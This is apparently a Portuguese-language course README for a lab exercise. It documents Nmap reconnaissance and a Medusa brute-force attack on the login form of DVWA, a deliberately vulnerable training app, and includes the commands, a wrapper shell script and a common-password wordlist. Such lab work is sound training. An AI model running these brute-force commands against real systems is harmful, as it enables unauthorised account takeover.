# Curso_DIO
# 🔐 Projeto de Auditoria e Análise de Segurança – Repositório Público
# 🔐 Projeto Completo — Ataque Brute Force com Medusa + DVWA + Kali Linux

Este repositório contém demonstração, documentação e entrega do desafio de força bruta utilizando Medusa no Kali Linux contra a DVWA.

---

## 🚀 Objetivos do Projeto
- Realizar reconhecimento com **Nmap**
- Explorar falha de autenticação da DVWA
- Realizar ataque de força bruta com **Medusa**
- Automatizar o processo usando script shell
- Documentar tudo com clareza e imagens

---

## 📁 Estrutura do Repositório

```
bruteforce-medusa-pro/
│
├── README.md
├── wordlists/
│   └── wordlist.txt
├── scripts/
│   └── medusa_bruteforce.sh
├── configs/
│   └── nmap_scan.txt
└── images/
    ├── nmap-scan.png
    ├── dvwa-login.png
    └── medusa-attack.png
```

---

## 🔎 1. Reconhecimento com Nmap

Comando utilizado:

```bash
nmap -sV -A -p- 192.168.1.10
```

Arquivo gerado:  
📄 `/configs/nmap_scan.txt`

Imagem ilustrativa:  
🖼 `/images/nmap-scan.png`

---

## 🔑 2. Configuração do DVWA
- Acessar: `http://192.168.1.10/dvwa`
- Definir nível: **LOW**
- Criar ambiente vulnerável

Imagem:  
🖼 `dvwa-login.png`

---

## 🔨 3. Ataque Brute Force com Medusa

Comando:

```bash
medusa -h 192.168.1.10 -u admin -P wordlists/wordlist.txt -M http -m DIR:/dvwa/login.php FORM:username=^USER^&password=^PASS^ -T 5
```

Resultado esperado:

```
ACCOUNT FOUND: [http] Host: 192.168.1.10 User: admin Password: 123456
```

Imagem ilustrativa:  
🖼 `medusa-attack.png`

---

## 🤖 4. Script Automatizado

Script em `/scripts/medusa_bruteforce.sh`:

```bash
#!/bin/bash
IP=$1
USER=$2
WORDLIST=$3

echo "[+] Executando ataque Medusa..."
medusa -h $IP -u $USER -P $WORDLIST -M http -m DIR:/dvwa/login.php FORM:username=^USER^&password=^PASS^ -T 5
```

---

## 🧪 5. Wordlist

Arquivo: `/wordlists/wordlist.txt`

Contém senhas reais utilizadas em ataques comuns:
- 123456
- admin
- password
- qwerty
- 12345678
- test123

---

## 📸 Imagens

As imagens incluídas são ilustrativas para seu repositório, apresentando:

- Resultado de scan Nmap  
- Tela de login DVWA  
- Execução do Medusa  

---

## 🔗 Documentações Oficiais
- Kali Linux — https://www.kali.org
- DVWA — https://github.com/digininja/DVWA
- Medusa — http://foofus.net/goons/jmk/medusa/medusa.html
- Nmap — https://nmap.org/book/
- GitHub Docs — https://docs.github.com

---
